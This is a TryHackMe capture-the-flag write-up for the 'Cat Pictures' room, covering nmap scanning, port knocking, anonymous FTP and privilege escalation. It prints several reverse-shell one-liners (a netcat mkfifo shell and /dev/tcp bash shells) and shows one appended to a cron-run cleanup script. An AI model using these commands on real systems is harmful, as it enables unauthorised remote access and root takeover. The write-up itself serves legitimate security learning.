@@ -1,0 +1,126 @@
+---
+title: "Cat Pictures TryHackMe"
+date: "07-14-2021"
+author: "Reda BELHAJ"
+summary: "This is a Writeup to a room in TryHackMe called Cat Pictures Created by gamercat and has this description: I made a forum where you can post cute cat pictures!"
+tags: ["Tryhackme", "Ctf", "Writeup"]
+image: "/images/Cat/Cat.jpg"
+---
+
+## Enumeration
+### Nmap Scan
+The first step of my enumeration was a scan with **nmap**. by the command:
+
+```
+nmap -sV -p- 10.10.229.237
+
+PORT STATE SERVICE REASON VERSION  
+22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
+4420/tcp open nvm-express? syn-ack  
+8080/tcp open http syn-ack Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
+```
+
+
+
+There is a web server available on port 8080 where we will find a forum page powered by [phpBB](https://www.phpbb.com/) : and it's an Internet forum package in the PHP scripting language. The name "phpBB" is an abbreviation of PHP Bulletin Board.
+
+And by looking around in the forum I see the last post that have some clues about the next step `knock`👊.
+
+![Post Image](/images/Cat/post.jpg)
+
+### Port Knocking
+**port knocking** is a method of externally opening [ports](https://en.wikipedia.org/wiki/TCP_and_UDP_port) on a [firewall](https://en.wikipedia.org/wiki/Firewall_(networking) "Firewall (networking)") by generating a connection attempt on a set of prespecified closed ports. 
+The port 21 will only be open when you request 1111, 2222, 3333, 4444 in sequence.
+
+![Knock Image](/images/Cat/knock.jpg)
+
+```
+knock 10.10.229.237 1111 2222 3333 4444
+```
+
+After many knocking commands I run the nmap command and I get a new open port.
+
+![Scan2 Image](/images/Cat/scan2.jpg)
+
+So I connected with anonymous in ftp and i found a `note.txt`:
+
+![Ftp image](/images/Cat/ftp.jpg)
+
+```
+cat note.txt  
+In case I forget my password, I'm leaving a pointer to the internal shell service on the server.Connect to port 4420, the password is sa*********.  
+- ca*****r
+```
+
+So the `note.txt` gives us the credentials for port 4420 and We gonna try to connect to the port using netcat. when I connected to the port i try a rm reverse shell on my 4444 port.
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.174.180 4444 >/tmp/f
+```
+
+So I browse for a little bit and I found an executable in the home directory when I run it, It demand us a password so I decided to output the binary using cat command :
+
+```
+cat runme
+```
+
+And I found the password. When entering the correct password in the binary it generates a SSH key.
+
+```
+chmod 600 id_rsa
+ssh catlover@10.10.61.235 -i id_rsa 
+```
+
+## User Flag
+
+By browsing dome of the directories I found the user flag in the /root :
+
+```
+7cf90a0e7c5d****************************
+```
+
+## Root Flag
+
+So first I output the .bash_history file and I found it not empty :
+
+```
+...
+cat /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+clear
+cat /etc/crontab
+ls -alt /
+cat /post-init.sh 
+cat /opt/clean/clean.sh 
+bash -i >&/dev/tcp/192.168.4.20/4444 <&1
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+cat /var/log/dpkg.log 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+exit
+```
+
+```
+cat /opt/clean/clean.sh   
+#!/bin/bash
+
+rm -rf /tmp/*
+```
+
+So the clean shell cleans and remove all the temporary files on the system, So lets try to add a reverse shell on the clean.sh file.
+
+```
+echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.174.180/4444 0>&1'" >> clean.sh
+```
+
+After 1 to 2 minutes I finally got the shell and the root flag:
+
+```
+cat root.txt
+Here is your flag:
+
+4a98e43d78bab2**************************
+```
